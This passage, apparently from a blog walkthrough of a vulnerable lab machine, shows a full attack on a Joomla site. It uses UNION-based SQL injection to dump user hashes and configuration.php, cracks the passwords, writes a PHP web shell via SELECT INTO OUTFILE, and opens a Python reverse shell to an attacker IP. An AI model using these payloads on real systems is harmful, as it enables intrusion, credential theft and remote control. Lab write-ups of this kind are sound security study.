+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, table_name from information_schema.tables--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get all column name of table jos_users</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next, get column username and password:</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The format is hash:salt</p>
+
+<p>use my previous joomla hash crack script <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>
+
+<pre><code>./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt 
+</code></pre>
+
+<p>for administrator, I didn&rsquo;t get the password</p>
+
+<p>for JSmith, password is matrix, for BTallor, password is victim.</p>
+
+<p>login using JSmith, find nowhere can upload the webshell. check the configuration.php file</p>
+
+<p><code>http://192.168.41.158:666/index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=1 union all select 1, load_file('/var/www/configuration.php')--</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find the username/password. Use it login phpmyadmin</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I will create a backdoor using mysql:</p>
+
+<pre><code>create database pwn;
+create table backdoor(script text);
+insert into backdoor(script) values('&lt;?php echo "&lt;pre&gt;"; system($_GET["cmd"]); echo "&lt;/pre&gt;"; ?&gt;');
+select * into outfile "/var/www/backdoor3.php" from backdoor;
+</code></pre>
+
+<p>check the backdoor.</p>
+
+<p><code>http://192.168.41.158:666/backdoor3.php?cmd=uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>good.</p>
+
+<p>Setup netcat and</p>
+
+<pre><code>http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>uname -a</code></p>
+
+<p>find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.</p>
+
+<p><img src="/images/blog/vulhub/rtb2/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
